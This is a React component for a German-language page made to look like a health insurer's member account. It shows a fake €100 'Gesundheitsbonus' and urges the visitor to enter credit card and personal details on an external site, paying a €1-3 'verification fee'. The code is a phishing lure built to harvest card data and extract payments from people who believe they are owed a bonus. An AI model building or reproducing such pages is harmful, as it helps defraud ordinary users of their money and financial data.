
import React from 'react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { Euro } from 'lucide-react';
import { Button } from '../components/ui/button';

const Dashboard = () => {
  const handleRedirect = () => {
    window.open('https://site.com', '_blank');
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#eceae8' }}>
      <Header />
      
      {/* Main Dashboard Content */}
      <main className="py-4 md:py-8">
        <div className="container mx-auto px-0 max-w-4xl">
          {/* Page Header */}
          <div className="mb-6 md:mb-8 px-4 md:px-0">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-8 h-8 bg-gray-400 rounded-full flex items-center justify-center">
                <Euro size={20} className="text-white" />
              </div>
              <h1 className="text-xl md:text-2xl font-normal text-gray-800">
                Mein Beitragskonto
              </h1>
            </div>
          </div>

          {/* Account Balance Section - Full Width */}
          <div className="bg-white shadow-sm mb-6 w-full">
            <div className="p-4 md:p-6 border-b">
              <div className="text-sm text-gray-600 mb-2">Aktueller Kontostand</div>
              <div className="flex items-baseline gap-2">
                <span className="text-3xl md:text-4xl font-light text-gray-800">100,00</span>
                <span className="text-base md:text-lg text-gray-600">Euro</span>
              </div>
              <p className="text-sm text-gray-600 mt-2">
                Ihr Gesundheitsbonus ist zur Auszahlung bereit.
              </p>
            </div>

            <div className="p-4 md:p-6 w-full">
              <h3 className="font-medium text-gray-800 mb-4">Verfügbare Auszahlungen</h3>
              
              {/* Health Bonus Section */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-4 md:p-6 w-full">
                <div className="flex items-start justify-between">
                  <div className="flex-1">
                    <h4 className="font-medium text-green-800 mb-3 text-base md:text-lg">
                      🎉 Gesundheitsbonus - 100,00 Euro verfügbar
                    </h4>
                    <p className="text-sm text-green-700 mb-4 leading-relaxed">
                      Sie sind berechtigt für einen €100 Gesundheitsbonus im Rahmen unseres jährlichen Präventionsprogramms. Diese Auszahlung wurde durch Ihre Teilnahme an Vorsorgeuntersuchungen und verantwortungsvolle Nutzung unserer Leistungen ermöglicht.
                    </p>
                    <p className="text-sm text-green-700 mb-4 leading-relaxed">
                      Zur sicheren Bearbeitung der Auszahlung auf Ihre Kreditkarte müssen Sie Ihre Kartendaten sowie persönlichen Informationen auf der nächsten Seite bestätigen. Eine Bearbeitungsgebühr zwischen €1-3 wird für die Verifikation erhoben.
                    </p>
                    <p className="text-sm text-green-700 mb-5 font-medium">
                      Der Bonus wird nach erfolgreicher Verifizierung innerhalb von 3-5 Werktagen auf Ihre Kreditkarte überwiesen.
                    </p>
                    <Button 
                      onClick={handleRedirect}
                      className="bg-green-600 hover:bg-green-700 text-white px-4 md:px-6 py-2 text-sm md:text-base w-full md:w-auto"
                    >
                      Daten bestätigen und Auszahlung erhalten
                    </Button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Dashboard;
